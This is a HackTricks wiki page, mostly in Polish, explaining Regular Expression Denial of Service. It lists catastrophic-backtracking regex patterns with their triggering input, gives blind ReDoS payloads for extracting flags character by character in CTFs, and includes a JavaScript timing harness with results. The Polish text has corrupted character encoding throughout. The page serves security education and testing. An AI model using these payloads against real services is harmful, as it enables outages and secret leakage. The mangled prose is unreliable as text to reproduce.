# Regular expression Denial of Service - ReDoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# Regular Expression Denial of Service (ReDoS)

**Denial of Service z powodu wyra偶enia regularnego (ReDoS)** ma miejsce, gdy kto wykorzystuje saboci w dziaaniu wyra偶e regularnych (spos贸b na wyszukiwanie i dopasowywanie wzorc贸w w tekcie). Czasami, gdy u偶ywa si wyra偶e regularnych, mog one sta si bardzo wolne, szczeg贸lnie jeli tekst, z kt贸rym pracuj, staje si wikszy. Ta wolno mo偶e by tak za, 偶e ronie naprawd szybko nawet przy niewielkich zwikszeniach rozmiaru tekstu. Atakujcy mog wykorzysta ten problem, aby spowodowa, 偶e program u偶ywajcy wyra偶e regularnych przestanie dziaa poprawnie na dugi czas.

## Problematyczny algorytm regex naiwnoci

**Sprawd藕 szczeg贸y w [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**

## Ze wyra偶enia regularne <a href="#evil-regexes" id="evil-regexes"></a>

Zy wz贸r wyra偶enia regularnego to taki, kt贸ry mo偶e **utkn na stworzonym wejciu, powodujc DoS**. Ze wzory regex zazwyczaj zawieraj grupowanie z powt贸rzeniem oraz powt贸rzenie lub alternatyw z nakadajcymi si elementami wewntrz powt贸rzonej grupy. Niekt贸re przykady zych wzor贸w to:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} dla x > 10

Wszystkie te wzory s podatne na wejcie `aaaaaaaaaaaaaaaaaaaaaaaa!`.

## adunki ReDoS

### Ekstrakcja cigu za pomoc ReDoS

W CTF (lub bug bounty) by mo偶e **kontrolujesz regex, z kt贸rym dopasowywana jest wra偶liwa informacja (flaga)**. Wtedy mo偶e by przydatne, aby **strona zamara (przekroczenie czasu lub du偶szy czas przetwarzania)**, jeli **regex dopasowa** i **nie, jeli nie dopasowa**. W ten spos贸b bdziesz m贸g **ekstrahowa** cig **znak po znaku**:

* W [**tym pocie**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) mo偶esz znale藕 t regu ReDoS: `^(?=<flag>)((.*)*)*salt$`
* Przykad: `^(?=HTB{sOmE_fl搂N搂)((.*)*)*salt$`
* W [**tym opisie**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) mo偶esz znale藕 ten: `<flag>(((((((.*)*)*)*)*)*)*)!`
* W [**tym opisie**](https://ctftime.org/writeup/25869) u偶yto: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### Kontrolowanie wejcia i regexu w ReDoS

Poni偶ej znajduj si przykady **ReDoS**, w kt贸rych **kontrolujesz** zar贸wno **wejcie**, jak i **regex**:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## Narzdzia

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## Odniesienia
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
